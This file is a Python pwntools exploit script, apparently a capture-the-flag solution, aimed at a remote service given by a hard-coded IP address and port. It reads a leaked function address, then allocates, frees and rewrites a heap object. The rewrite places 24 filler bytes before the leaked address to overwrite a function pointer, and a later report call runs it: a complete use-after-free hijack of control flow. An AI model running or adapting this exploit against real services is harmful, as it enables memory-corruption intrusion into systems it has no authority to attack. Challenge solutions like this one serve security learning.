#!/usr/bin/env python3
from pwn import *

# ----------------------------
# Configuration
# ----------------------------
HOST = '16.16.199.115'   # change if needed
PORT = 9005              # change if needed

# ----------------------------
# Connect to remote server
# ----------------------------
p = remote(HOST, PORT)

# ----------------------------
# Receive the leaked function address
# ----------------------------
p.recvuntil(b'basement_secrets() is at ')
basement_addr = int(p.recvline().strip(), 16)
log.info(f"basement_secrets at: {hex(basement_addr)}")

# ----------------------------
# Step 1: Add titan (index 0)
# ----------------------------
p.recvuntil(b'Choice: ')
p.sendline(b'1')
p.recvuntil(b'titan type: ')
p.sendline(b'Colossal Titan')

# ----------------------------
# Step 2: Free titan (index 0)
# ----------------------------
p.recvuntil(b'Choice: ')
p.sendline(b'2')
p.recvuntil(b'remove ')
p.sendline(b'0')

# ----------------------------
# Step 3: Update freed titan
# ----------------------------
p.recvuntil(b'Choice: ')
p.sendline(b'3')
p.recvuntil(b'update ')
p.sendline(b'0')
p.recvuntil(b'new titan name: ')

# 24 bytes name + overwrite function pointer
payload = b'A' * 24 + p64(basement_addr)
p.send(payload)

# ----------------------------
# Step 4: Trigger report
# ----------------------------
p.recvuntil(b'Choice: ')
p.sendline(b'4')
p.recvuntil(b'report ')
p.sendline(b'0')

# ----------------------------
# Get the flag
# ----------------------------
p.interactive()
